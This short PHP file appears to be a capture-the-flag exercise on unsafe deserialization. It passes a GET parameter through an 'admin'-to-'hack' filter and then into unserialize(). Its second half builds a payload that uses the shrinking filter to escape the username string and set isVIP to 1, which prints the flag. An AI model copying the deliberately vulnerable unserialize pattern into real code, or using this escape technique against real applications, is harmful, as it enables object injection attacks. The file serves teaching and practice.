<?php
class user
{
    public $username;
    public $password;
    public $isVIP;

    public function __construct($u, $p)
    {
        $this->username = $u;
        $this->password = $p;
        $this->isVIP = 0;
    }

    function login(){
        $isVip=$this->isVIP;
        if($isVip==1){
            echo 'flag is loveu';
            echo '<br/>';
        }else{
            echo 'fuck';
        }

    }
}

function filter($obj) {
    return preg_replace("/admin/","hack",$obj);
}

$obj=$_GET['x'];
if(isset($obj)){
    $obj = filter($obj);
    $o=unserialize($obj);
    $o->login();
}

//pop构造
$u='adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin';
$p='";s:8:"password";s:6:"123456";s:5:"isVIP";i:1;}';

$a = new user($u,$p);
$a_seri = serialize($a);
$a_seri_filter = filter($a_seri);

print_r($a_seri);
print_r("\n");
print_r($a_seri_filter);




